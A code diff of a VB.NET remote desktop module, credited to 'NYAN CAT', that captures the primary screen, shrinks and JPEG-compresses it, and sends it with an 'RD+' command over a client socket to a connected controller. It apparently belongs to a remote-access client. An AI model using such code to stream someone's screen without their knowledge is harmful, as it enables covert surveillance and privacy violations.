@@ -1,9 +1,10 @@
 ﻿Imports System.Drawing
+Imports System.Drawing.Drawing2D
 Imports System.Drawing.Imaging
 Imports System.Windows.Forms
 
 '       │ Author     : NYAN CAT
-'       │ Name       : Simple remote desktop. "capture,resize,compress"
+'       │ Name       : Simple remote desktop. "capture,resize,compress,send"
 
 '       Contact Me   : https://github.com/NYAN-x-CAT
 
@@ -13,15 +14,15 @@ Public Class RemoteDesktop
 
     Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
         Try
+            Dim B As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
+            Dim g As Graphics = Graphics.FromImage(B)
+            g.CompositingQuality = CompositingQuality.HighSpeed
+            g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
 
-            Dim ScreenSize As Size = New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
-            Dim screenGrab As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
-            Dim g As Graphics = Graphics.FromImage(screenGrab)
-            g.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)
-
-            Dim Temp As New Bitmap(W, H)
-            Dim G2 As Graphics = Graphics.FromImage(Temp)
-            G2.DrawImage(screenGrab, New Rectangle(0, 0, W, H), New Drawing.Rectangle(0, 0, ScreenSize.Width, ScreenSize.Height), GraphicsUnit.Pixel)
+            Dim Resize As New Bitmap(W, H)
+            Dim g2 As Graphics = Graphics.FromImage(Resize)
+            g2.CompositingQuality = CompositingQuality.HighSpeed
+            g2.DrawImage(B, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
 
             Dim encoderParameter As EncoderParameter = New EncoderParameter(Encoder.Quality, 40)
             Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
@@ -29,19 +30,31 @@ Public Class RemoteDesktop
             encoderParameters.Param(0) = encoderParameter
 
             Dim MS As New IO.MemoryStream
-            Temp.Save(MS, encoderInfo, encoderParameters)
+            Resize.Save(MS, encoderInfo, encoderParameters)
 
-            ClientSocket.Send("RD+" + ClientSocket.SPL + BS(MS.ToArray))
+            Try
+                SyncLock ClientSocket.S
+                    Dim MEM As New IO.MemoryStream
+                    Dim Bb As Byte() = SB(("RD+" + ClientSocket.SPL + BS(MS.ToArray)))
+                    Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
+
+                    MEM.Write(L, 0, L.Length)
+                    MEM.Write(Bb, 0, Bb.Length)
+
+                    ClientSocket.S.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
+                    ClientSocket.S.Send(MEM.ToArray, 0, MEM.Length, Net.Sockets.SocketFlags.None)
+
+                    MEM.Flush()
+                    MEM.Dispose()
+                End SyncLock
+            Catch ex As Exception
+                ClientSocket.isConnected = False
+            End Try
 
             Try
                 g.Dispose()
                 G2.Dispose()
-                screenGrab.Dispose()
-            Catch ex As Exception
-            End Try
-
-
-            Try
+                B.Dispose()
                 MS.Dispose()
             Catch ex As Exception
             End Try
@@ -49,11 +62,7 @@ Public Class RemoteDesktop
         Catch ex As Exception
         End Try
 
-
-
     End Sub
-
-
 
     Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
         Try
